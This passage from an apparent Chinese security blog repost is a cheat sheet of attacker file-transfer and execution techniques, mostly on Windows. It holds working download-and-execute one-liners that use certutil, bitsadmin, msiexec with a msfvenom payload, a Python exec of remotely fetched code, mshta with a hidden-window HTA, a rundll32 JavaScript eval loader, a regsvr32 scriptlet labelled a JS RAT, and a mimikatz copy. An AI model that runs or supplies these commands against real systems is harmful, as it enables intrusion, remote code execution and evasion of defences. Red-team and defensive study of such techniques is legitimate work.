+get access.log # 将服务器上的access.log下载到E:\file</code></pre><h3 id="2-10-Netcat"><a href="#2-10-Netcat" class="headerlink" title="2.10 Netcat"></a>2.10 Netcat</h3><pre><code>攻击者的电脑上输入：
+
+cat file | nc -l 1234
+
+这个命令会将file的内容输出到本地的1234端口中，然后不论谁连接此端口，file的内容将会发送到连接过来的IP。
+
+目标电脑上的命令：
+
+nc host_ip 1234 &gt; file
+
+这条命令将连接攻击者的电脑，接受file内容保存。</code></pre><h2 id="0x03-Windows"><a href="#0x03-Windows" class="headerlink" title="0x03 Windows"></a>0x03 Windows</h2><h3 id="3-1-Powershell"><a href="#3-1-Powershell" class="headerlink" title="3.1 Powershell"></a>3.1 Powershell</h3><blockquote>
+<p>PowerShell 是一种winodws原生的脚本语言，对于熟练使用它的人来说，可以实现很多复杂的功能。</p>
+</blockquote>
+<pre><code>下面这两条指令实现了从Internet网络下载一个文件。
+
+$p = New-Object System.Net.WebClient
+$p.DownloadFile(&quot;http://domain/file&quot; &quot;C:\%homepath%\file&quot;)</code></pre><h3 id="3-2-IPC"><a href="#3-2-IPC" class="headerlink" title="3.2 IPC$"></a>3.2 IPC$</h3><pre><code>copy \192.168.3.1\c$\test.exe E:\file
+
+cmd.exe /k &lt; \webdavserver\folder\batchfile.txt</code></pre><h3 id="3-3-Certutil"><a href="#3-3-Certutil" class="headerlink" title="3.3 Certutil"></a>3.3 Certutil</h3><blockquote>
+<p>可以应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2</p>
+</blockquote>
+<pre><code>certutil -urlcache -split -f http://192.168.3.1/test.exe file.exe
+certutil -urlcache -split -f http://192.168.3.1/test.exe delete      #删除缓存
+
+certutil -verifyctl -split -f -split http://192.168.3.1/test.exe
+#此条命令，会将原文件下载成为临时 bin 文件，把名字改回来一样可以正常运行
+
+文件下载并执行如下：
+certutil -urlcache -split -f http://site.com/a a.exe &amp;&amp; a.exe &amp;&amp;  del a.exe &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete</code></pre><h3 id="3-4-Visual-Basic"><a href="#3-4-Visual-Basic" class="headerlink" title="3.4 Visual Basic"></a>3.4 Visual Basic</h3><blockquote>
+<p>在1998年Visual Basic最终标准在windows上确定。下面的代码可以实现下载文件，虽然它的长度比Powershell长多了。</p>
+</blockquote>
+<pre><code>Set args = Wscript.Arguments
+Url = &quot;http://domain/file&quot;
+dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
+dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
+xHttp.Open &quot;GET&quot;, Url, False
+xHttp.Send
+with bStrm
+    .type = 1 &apos;
+    .open
+    .write xHttp.responseBody
+    .savetofile &quot; C:\%homepath%\file&quot;, 2 &apos;
+end with</code></pre><blockquote>
+<p>在windows中Cscript指令可以允许你执行VBS脚本文件或者对script脚本做一些设置。在windows 7中这个指令并不是必须要用到。但是在windows XP中需要使用这条指令，如下所示:</p>
+</blockquote>
+<pre><code>cscript test.vbs</code></pre><h3 id="3-5-Tftp"><a href="#3-5-Tftp" class="headerlink" title="3.5 Tftp"></a>3.5 Tftp</h3><blockquote>
+<p>在Windows Vista以及以后的版本中默认有FTP，可以使用以下命令运行：</p>
+</blockquote>
+<pre><code>上传：
+tftp -i IP地址 PUT C:\%homepath%\file 远程存放位置
+
+下载：
+tftp -i IP地址 GET C:\%homepath%\file 本地存放位置</code></pre><h3 id="3-6-Bitsadmin"><a href="#3-6-Bitsadmin" class="headerlink" title="3.6 Bitsadmin"></a>3.6 Bitsadmin</h3><blockquote>
+<p>Bitsadmin是Windows命令行工具，用户可以使用它来创建下载或上传的任务。只能命令下载到指定路径上，win7以上：</p>
+</blockquote>
+<pre><code>bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://192.168.203.140/b.ps1&quot; &quot;E:\\phpstudy_pro\\WWW\\b.ps1&quot;
+
+bitsadmin /rawreturn /transfer getfile http://192.168.3.1/test.txt E:\file\test.txt
+
+bitsadmin /rawreturn /transfer getpayload http://192.168.3.1/test.txt E:\file\test.txt</code></pre><h3 id="3-7-msiexec"><a href="#3-7-msiexec" class="headerlink" title="3.7 msiexec"></a>3.7 msiexec</h3><pre><code>msiexec /q /i http://192.168.3.1/calc.png
+
+calc.png:
+
+msfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.png</code></pre><h3 id="3-8-IEExec"><a href="#3-8-IEExec" class="headerlink" title="3.8 IEExec"></a>3.8 IEExec</h3><pre><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; caspol -s off
+
+C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; IEExec http://192.168.3.1</code></pre><h3 id="3-9-Python"><a href="#3-9-Python" class="headerlink" title="3.9 Python"></a>3.9 Python</h3><pre><code>C:\python27\python.exe -c “import urllib2; exec urllib2.urlopen(‘http://192.168.3.1/test.zip’).read();”</code></pre><h3 id="3-10-Mshta"><a href="#3-10-Mshta" class="headerlink" title="3.10 Mshta"></a>3.10 Mshta</h3><pre><code>mshta http://192.168.3.1/run.hta 
+
+run.hta 内容如下：
+
+&lt;HTML&gt; 
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
+&lt;HEAD&gt; 
+&lt;script language=&quot;VBScript&quot;&gt;
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
+objShell.Run &quot;cmd.exe /c net user&quot; // 这里填写命令
+self.close
+&lt;/script&gt;
+&lt;body&gt;
+demo
+&lt;/body&gt;
+&lt;/HEAD&gt; 
+&lt;/HTML&gt;
+
+执行命令：
+mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></pre><h3 id="3-11-Rundll32"><a href="#3-11-Rundll32" class="headerlink" title="3.11 Rundll32"></a>3.11 Rundll32</h3><blockquote>
+<p>依赖于WScript.shell这个组件:</p>
+</blockquote>
+<pre><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1:8081/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}%</code></pre><h3 id="3-12-Regsvr32"><a href="#3-12-Regsvr32" class="headerlink" title="3.12 Regsvr32"></a>3.12 Regsvr32</h3><blockquote>
+<p>Regsvr32命令用于注册COM组件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。</p>
+</blockquote>
+<blockquote>
+<p>WinXP及以上系统的regsvr32.exe在windows\system32文件夹下；2000系统的regsvr32.exe在winnt\system32文件夹下。</p>
+</blockquote>
+<pre><code>regsvr32 /u /s /i:http://192.168.3.1/test.data scrobj.dll</code></pre><blockquote>
+<p>test.data内容：</p>
+</blockquote>
+<pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+&lt;registration
+    progid=&quot;ShortJSRAT&quot;
+    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;
+    &lt;!-- Learn from Casey Smith @subTee --&gt;
+    &lt;script language=&quot;JScript&quot;&gt;
+        &lt;![CDATA[
+            ps  = &quot;cmd.exe /c calc.exe&quot;;
+            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);
+
+        ]]&gt;
+&lt;/script&gt;
+&lt;/registration&gt;
+&lt;/scriptlet&gt;</code></pre><blockquote>
+<p>还可以利用 <a href="https://github.com/CroweCybersecurity/ps1encode" target="_blank" rel="noopener">https://github.com/CroweCybersecurity/ps1encode</a> 生成sct文件：</p>
+</blockquote>
+<pre><code>regsvr32 /u /s /i:http://192.168.3.1/test.sct scrobj.dll</code></pre><h3 id="3-13-Windows-Share"><a href="#3-13-Windows-Share" class="headerlink" title="3.13 Windows Share"></a>3.13 Windows Share</h3><blockquote>
+<p>Windows shares可以加载一个驱动器，然后用命令来复制文件。</p>
+</blockquote>
+<pre><code>加载远程驱动：
+
+net use x: \\127.0.0.1\share /user:example.com\userID myPassword</code></pre><h3 id="3-14-格式转换"><a href="#3-14-格式转换" class="headerlink" title="3.14 格式转换"></a>3.14 格式转换</h3><blockquote>
+<p>当需要把一个exe文件放到目标计算机上时，Nishang可以使用PowerShell允许你把一个exe转换成hex，然后把hex再转换成原来的exe文件：</p>
+</blockquote>
+<pre><code>把exe转成hex文件输入：
+
+PS &gt; .\ExetoText.ps1 evil.exe evil.txt
+
+打开evil.txt文件，复制内容，然后通过RDP的剪贴板复制进目标计算机，把hex文件还原成exe文件输入：
+
+PS &gt; .\TexttoExe.ps1 evil.text evil.exe</code></pre><h3 id="3-15-其它"><a href="#3-15-其它" class="headerlink" title="3.15 其它"></a>3.15 其它</h3><h4 id="1-MSXSL-EXE"><a href="#1-MSXSL-EXE" class="headerlink" title="1.MSXSL.EXE"></a>1.MSXSL.EXE</h4><pre><code>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。</code></pre><h4 id="2-pubprn-vbs"><a href="#2-pubprn-vbs" class="headerlink" title="2.pubprn.vbs"></a>2.pubprn.vbs</h4><pre><code>在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\Windows\System32\Printing_Admin_Scripts\en-US</code></pre><h4 id="3-esentutl-exe-extrac32-exe"><a href="#3-esentutl-exe-extrac32-exe" class="headerlink" title="3.esentutl.exe/extrac32.exe"></a>3.esentutl.exe/extrac32.exe</h4><pre><code>esentutl.exe /y &quot;\\172.16.249.149\share mimikatz_trunk.zip&quot; /d&quot;C:\Users\Public\mimikatz_trunk.zip&quot; /0
+extrac32.exe /Y /C \\172.16.249.149\share\test.txt C:\Users\Public\test.txt</code></pre><p><a href="https://mp.weixin.qq.com/s/K8Siy2AV-ghpcvr7iOa0BA" target="_blank" rel="noopener" title="原文链接">原文链接：https://mp.weixin.qq.com/s/K8Siy2AV-ghpcvr7iOa0BA</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源。 </span>
